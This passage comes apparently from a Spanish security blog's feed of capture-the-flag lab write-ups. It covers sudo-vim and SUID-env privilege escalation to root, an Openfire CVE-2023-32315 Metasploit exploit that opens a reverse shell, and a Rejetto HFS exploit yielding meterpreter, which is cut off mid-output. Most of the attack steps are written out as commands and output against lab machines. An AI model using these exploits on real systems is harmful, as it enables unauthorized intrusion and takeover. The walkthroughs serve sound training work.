<p>Comprobamos con <code class="language-plaintext highlighter-rouge">id</code> que somos <strong>root</strong></p>

<h1 id="escalada-de-privilegios-2">Escalada de privilegios 2</h1>

<p>La segunda manera es ejecutar <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver que comandos puede ejecutar como <strong>root</strong> en el sistema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>russoski on 28c41160317a:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User russoski may run the following commands on 28c41160317a:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/vim
</code></pre></div></div>

<p>Como vemos puede ejecutar <code class="language-plaintext highlighter-rouge">vim</code> como <strong>root</strong>. Vamos a la famosa web de <em>GTFOBins</em> y encontramos la manera de escalar privilegios con <em>vim</em> <a href="https://gtfobins.github.io/gtfobins/vim/#sudo">GTFOBins vim</a>. Ejecutamos y comprobamos que somos <strong>root</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span><span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>

<span class="c"># whoami</span>
root
<span class="c">#</span>
</code></pre></div></div>

<h1 id="escalada-de-privilegios-3">Escalada de privilegios 3</h1>

<p>Para finalizar vamos a ver la tercera forma. Esta vez buscamos binarios que tengan el permiso <strong>SUID</strong> activo. Usamos <code class="language-plaintext highlighter-rouge">find</code> y le indicamos que busque desde la raiz <code class="language-plaintext highlighter-rouge">/</code>, ficheros <code class="language-plaintext highlighter-rouge">-type f</code>, que tengan el permiso +s <code class="language-plaintext highlighter-rouge">-perm -4000</code> y que mande los errores a <em>null</em> con <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/env
/usr/bin/mount
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</code></pre></div></div>

<p>Encuentra el binario <strong>env.</strong> Como vemos en <a href="https://gtfobins.github.io/gtfobins/env/#suid">GTFOBins env</a> se puede escalar privilegios de la siguiente manera:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>russoski@28c41160317a:~<span class="nv">$ </span>/usr/bin/env /bin/sh <span class="nt">-p</span>
<span class="c"># whoami</span>
root
<span class="c">#</span>
</code></pre></div></div>

<p>Y de esta manera hemos terminado el laboratorio</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="muy facil" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel muy facil y es de la plataforma dockerlabs.]]></summary></entry><entry><title type="html">ChocolateFire</title><link href="/posts/chocolatefire/" rel="alternate" type="text/html" title="ChocolateFire" /><published>2024-06-25T00:00:00+00:00</published><updated>2024-06-25T00:00:00+00:00</updated><id>/posts/chocolatefire</id><content type="html" xml:base="/posts/chocolatefire/"><![CDATA[<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT     STATE SERVICE
22/tcp   open  ssh
5222/tcp open  xmpp-client
5223/tcp open  hpvirtgrp
5262/tcp open  unknown
5263/tcp open  unknown
5269/tcp open  xmpp-server
5270/tcp open  xmp
5275/tcp open  unknown
5276/tcp open  unknown
7070/tcp open  realserver
7777/tcp open  cbt
9090/tcp open  zeus-admin
MAC Address: 02:42:AC:11:00:02 <span class="o">(</span>Unknown<span class="o">)</span>
</code></pre></div></div>

<p>Vemos que tiene bastantes puertos abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,5222,5223,5262,5263,5269,5270,5275,5276,7079,7777,9090 <span class="nt">-v</span> 172.17.0.2
PORT     STATE  SERVICE        VERSION
22/tcp   open   ssh            OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 9c:7c:e5:ea:fe:ac:f5:bc:21:54:87:66:70:ed:df:75 <span class="o">(</span>RSA<span class="o">)</span>
|   256 b2:1a:b1:05:0e:7e:94:18:98:19:8f:60:d7:04:7a:1c <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 c1:81:ba:4f:1a:99:9f:32:10:4a:6a:d9:f4:aa:40:de <span class="o">(</span>ED25519<span class="o">)</span>
5222/tcp open   jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       <span class="o">(</span><span class="nb">timeout</span><span class="o">)</span>
|     auth_mechanisms: 
|     stream_id: 99oqy71pmn
|     compression_methods: 
|     unknown: 
|     capabilities: 
|_    features: 
|_ssl-cert: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
5223/tcp open   ssl/hpvirtgrp?
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>5262/tcp open   jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       <span class="o">(</span><span class="nb">timeout</span><span class="o">)</span>
|     auth_mechanisms: 
|     stream_id: 2qbrswme5i
|     compression_methods: 
|     unknown: 
|     capabilities: 
|_    features: 
5263/tcp open   ssl/unknown
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>5269/tcp open   xmpp           Wildfire XMPP Client
| xmpp-info: 
|   Respects server name
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       host-unknown
|       <span class="o">(</span><span class="nb">timeout</span><span class="o">)</span>
|     auth_mechanisms: 
|     stream_id: awy7elrapf
|     compression_methods: 
|     unknown: 
|     capabilities: 
|_    features: 
5270/tcp open   xmp?
5275/tcp open   jabber         Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       <span class="o">(</span><span class="nb">timeout</span><span class="o">)</span>
|     auth_mechanisms: 
|     stream_id: 69e0bm6okz
|     compression_methods: 
|     unknown: 
|     capabilities: 
|_    features: 
5276/tcp open   ssl/unknown
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>7079/tcp closed unknown
7777/tcp open   socks5         <span class="o">(</span>No authentication<span class="p">;</span> connection failed<span class="o">)</span>
| socks-auth-info: 
|_  No authentication
9090/tcp open   zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jun 2024 16:16:54 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:03 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     &lt;html&gt;
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;&lt;/title&gt;
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"refresh"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"0;URL=index.jsp"</span><span class="o">&gt;</span>
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;/body&gt;
|     &lt;/html&gt;
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jun 2024 16:16:59 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x0
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
|     Content-Length: 69
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x0&lt;/pre&gt;
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
|     Content-Length: 49
|     Connection: close
|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x1
|     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character <span class="nv">CNTL</span><span class="o">=</span>0x1&lt;/pre&gt;
</code></pre></div></div>

<p>Lo único que llama la atención es el puerto <code class="language-plaintext highlighter-rouge">9090</code>, vemos que nos da una respuesta <code class="language-plaintext highlighter-rouge">HTTP1.1 200 OK</code>.  Entramos con el navegador a la url <code class="language-plaintext highlighter-rouge">http://172.17.0.2:9090</code>:</p>

<p><img src="/assets/images/chocolatefire/1.jpg" alt="image" /></p>

<p>Y nos encontramos un panel de login de <code class="language-plaintext highlighter-rouge">openfire 4.7.4</code>.</p>

<p>Buscamos si existe alguna vulnerabilidad para esa versión. Encontramos el exploit <a href="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-32315">cve-2023-32315</a>.
En el artículo hace mención a un plugin de <code class="language-plaintext highlighter-rouge">metasploit</code>. Abrimos metasploit con <code class="language-plaintext highlighter-rouge">msfconsole</code> y buscamos el servicio que queremos explotar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> search openfire

Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                                        Disclosure Date  Rank       Check  Description</span>
   -  <span class="nt">----</span>                                                        <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/multi/http/openfire_auth_bypass                     2008-11-10       excellent  Yes    Openfire Admin Console Authentication Bypass
   1    <span class="se">\_</span> target: Java Universal                                 <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
   2    <span class="se">\_</span> target: Windows x86 <span class="o">(</span>Native Payload<span class="o">)</span>                   <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
   3    <span class="se">\_</span> target: Linux x86 <span class="o">(</span>Native Payload<span class="o">)</span>                     <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
   4  exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315  2023-05-26       excellent  Yes    Openfire authentication bypass with RCE plugin
</code></pre></div></div>

<p>Elegimos la opción 4, <code class="language-plaintext highlighter-rouge">use 4</code>, y vemos las opciones del plugin con <code class="language-plaintext highlighter-rouge">options</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use 4
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload java/shell/reverse_tcp
msf6 exploit<span class="o">(</span>multi/http/openfire_auth_bypass_r
ce_cve_2023_32315<span class="o">)</span> <span class="o">&gt;</span> options

Module options <span class="o">(</span>exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315<span class="o">)</span>:

   Name          Current Setti  Required  Description
                 ng
   <span class="nt">----</span>          <span class="nt">-------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   ADMINNAME                    no        Openfire admin user
                                           name, <span class="o">(</span>default: ra
                                          ndom<span class="o">)</span>
   PLUGINAUTHOR                 no        Openfire plugin aut
                                          hor, <span class="o">(</span>default: rand
                                          om<span class="o">)</span>
   PLUGINDESC                   no        Openfire plugin des
                                          cription, <span class="o">(</span>default:
                                           random<span class="o">)</span>
   PLUGINNAME                   no        Openfire plugin bas
                                          e name, <span class="o">(</span>default: r
                                          andom<span class="o">)</span>
   Proxies                      no        A proxy chain of fo
                                          rmat <span class="nb">type</span>:host:port
                                          <span class="o">[</span>,type:host:port][.
                                          ..]
   RHOSTS                       <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>,
                                           see https://docs.m
                                          etasploit.com/docs/
                                          using-metasploit/ba
                                          sics/using-metasplo
                                          it.html
   RPORT         9090           <span class="nb">yes       </span>The target port <span class="o">(</span>TC
                                          P<span class="o">)</span>
   SSL           <span class="nb">false          </span>no        Negotiate SSL/TLS f
                                          or outgoing connect
                                          ions
   TARGETURI     /              <span class="nb">yes       </span>The base path to th
                                          e web application
   VHOST                        no        HTTP server virtual
                                           host

Payload options <span class="o">(</span>java/shell/reverse_tcp<span class="o">)</span>:

   Name   Current Setting  Required  Description
   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   LHOST                   <span class="nb">yes       </span>The listen address <span class="o">(</span>an i
                                     nterface may be specifie
                                     d<span class="o">)</span>
   LPORT  4444             <span class="nb">yes       </span>The listen port

Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Java Universal

View the full module info with the info, or info <span class="nt">-d</span> command.

</code></pre></div></div>

<p>En este caso solo tenemos que modificar la ip del servidor con <code class="language-plaintext highlighter-rouge">set rhost 172.17.0.2</code> y nuestra ip para conseguir una shell reversa con <code class="language-plaintext highlighter-rouge">set lhost 172.17.0.1</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/http/openfire_auth_bypass_r
ce_cve_2023_32315<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 172.17.0.2
rhosts <span class="o">=&gt;</span> 172.17.0.2
msf6 exploit<span class="o">(</span>multi/http/openfire_auth_bypass_r
ce_cve_2023_32315<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 172.17.0.1
lhost <span class="o">=&gt;</span> 172.17.0.1

</code></pre></div></div>

<p>Ejecutamos el exploit con <code class="language-plaintext highlighter-rouge">run</code> y obtenemos la shell reversa como <strong>root</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/http/openfire_auth_bypass_r
ce_cve_2023_32315<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 172.17.0.1:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">"set AutoCheck false"</span> to disable<span class="o">)</span>
<span class="o">[</span>+] The target appears to be vulnerable. Openfire version is 4.7.4
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Grabbing the cookies.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nv">JSESSIONID</span><span class="o">=</span>node0cth6fd268hoq15f35ozhcwbce178.node0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nv">csrf</span><span class="o">=</span>lIe3q07bz2wrINa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding a new admin user.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Logging <span class="k">in </span>with admin user <span class="s2">"tcodhiugrmxzf"</span> and password <span class="s2">"2HvOx3pY"</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Upload and execute plugin <span class="s2">"aoxYPFC316nfr"</span> with payload <span class="s2">"java/shell/reverse_tcp"</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>2952 bytes<span class="o">)</span> to 172.17.0.2
<span class="o">[!]</span> Plugin <span class="s2">"aoxYPFC316nfr"</span> need manually clean-up via Openfire Admin console.
<span class="o">[!]</span> Admin user <span class="s2">"tcodhiugrmxzf"</span> need manually clean-up via Openfire Admin console.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>172.17.0.1:4444 -&gt; 172.17.0.2:53926<span class="o">)</span> at 2024-06-25 21:28:44 +0200

<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="nb">hostname
</span>9566bdac1160

</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma dockerlabs.]]></summary></entry><entry><title type="html">Espeto malagueño</title><link href="/posts/espeto/" rel="alternate" type="text/html" title="Espeto malagueño" /><published>2024-06-23T00:00:00+00:00</published><updated>2024-06-23T00:00:00+00:00</updated><id>/posts/espeto</id><content type="html" xml:base="/posts/espeto/"><![CDATA[<p>Estamos ante una máquina Windows de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:5b:2e:9c       PCS Systemtechnik GmbH
10.0.2.141      08:00:27:47:5a:9d       PCS Systemtechnik GmbH
</code></pre></div></div>

<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.141</code>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> , que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.141</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.141
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49158/tcp open  unknown
</code></pre></div></div>

<p>Una vez que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,139,445,5985,47001,49152,49153,49154,49155,49156,49158 <span class="nt">-v</span> 10.0.2.141
PORT      STATE SERVICE      VERSION
80/tcp    open  http         HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-time: 
|   <span class="nb">date</span>: 2024-06-23T13:28:01
|_  start_date: 2024-06-23T13:23:16
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: WIN-RE8NJPG9K5N, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:47:5a:9d <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
| Names:
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WIN-RE8NJPG9K5N&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|_  WIN-RE8NJPG9K5N&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|_clock-skew: mean: 4m43s, deviation: 0s, median: 4m43s

</code></pre></div></div>

<p>En el resultado vemos que en el puerto <code class="language-plaintext highlighter-rouge">80</code> hay un servidor <code class="language-plaintext highlighter-rouge">HFS 2.3</code> <code class="language-plaintext highlighter-rouge">(HTTP File Server)</code>.
<img src="/assets/images/espeto/1.png" alt="image" /></p>

<h1 id="intrusión">Intrusión</h1>

<p>Con <code class="language-plaintext highlighter-rouge">Metasploit</code> buscamos por si hubiera algún exploit disponible para esa versión.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> search hfs 2.3

Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                        Disclosure Date  Rank       Check  Description</span>
   -  <span class="nt">----</span>                                        <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1    <span class="se">\_</span> target: Automatic                      <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
   2    <span class="se">\_</span> target: Windows Powershell             <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
   3  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
</code></pre></div></div>

<p>Vemos que si que hay. Seleccionamos la opción 3 <code class="language-plaintext highlighter-rouge">use 3</code> y vemos las opciones disponibles que hay para el exploit con <code class="language-plaintext highlighter-rouge">options</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use 3
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> options

Module options <span class="o">(</span>exploit/windows/http/rejetto_hfs_exec<span class="o">)</span>:

   Name       Current Setting  Required  Description
   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   HTTPDELAY  10               no        Seconds to <span class="nb">wait </span>before terminating web server
   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
   RHOSTS                      <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SRVHOST    0.0.0.0          <span class="nb">yes       </span>The <span class="nb">local </span>host or network interface to listen on. This must be an address on the <span class="nb">local </span>machine or 0.0.0.0 to listen on all
                                          addresses.
   SRVPORT    8080             <span class="nb">yes       </span>The <span class="nb">local </span>port to listen on.
   SSL        <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
   SSLCert                     no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
   TARGETURI  /                <span class="nb">yes       </span>The path of the web application
   URIPATH                     no        The URI to use <span class="k">for </span>this exploit <span class="o">(</span>default is random<span class="o">)</span>
   VHOST                       no        HTTP server virtual host

Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC  process          <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   LHOST     192.168.1.12     <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT     4444             <span class="nb">yes       </span>The listen port

Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic

</code></pre></div></div>

<p>En nuestro caso cambiamos el Remote Host <code class="language-plaintext highlighter-rouge">set rhost 10.0.2.141</code> y el puerto que utiliza el exploit para hacer la explotación <code class="language-plaintext highlighter-rouge">set srvport 8081</code>. Ejecutamos el exploit con <code class="language-plaintext highlighter-rouge">exploit</code> y si todo ha salido bien, obtenemos una sesión de <code class="language-plaintext highlighter-rouge">meterpreter</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 10.0.2.141
rhosts <span class="o">=&gt;</span> 10.0.2.141
msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>srvport 8081
srvport <span class="o">=&gt;</span> 8081
msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 192.168.1.12:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using URL: http://192.168.1.12:8081/W4iYw9
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server started.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending a malicious request to /
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload request received: /W4iYw9
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>176198 bytes<span class="o">)</span> to 192.168.1.11
<span class="o">[!]</span> Tried to delete %TEMP%<span class="se">\U</span>nngBBbR.vbs, unknown result
